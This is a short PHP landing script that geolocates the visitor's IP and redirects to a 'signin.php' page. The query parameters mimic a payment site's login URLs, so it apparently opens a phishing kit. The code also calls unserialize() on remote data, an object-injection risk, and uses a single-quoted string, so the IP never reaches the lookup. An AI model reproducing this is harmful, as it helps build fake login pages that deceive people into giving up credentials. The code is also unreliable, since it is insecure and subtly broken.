<?php

session_start();

require_once __DIR__.'/functions/functions.php';

 
$ip = $_SERVER['REMOTE_ADDR']; // User Ip Address

$IpInfo = @unserialize(file_get_contents('http://ip-api.com/php/{$ip}'));



// Set Ip Info Session
$Country = $_SESSION['country'] = $IpInfo['country'];
$CountryCode = $_SESSION['countrycode'] = $IpInfo['countryCode'];

$UserAgent   = $_SERVER['HTTP_USER_AGENT'];
$BrowserLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];


if (isset($Country) || isset($CountryCode))
{

	header("Location: signin.php?country.x={$CountryCode}&locale.x=".substr($BrowserLang, 0, 2)."_{$CountryCode}");

}
else
{
	header("Location: signin.php?locale.x=".substr($BrowserLang, 0, 2)."&_token=".base64_encode(time())."");
}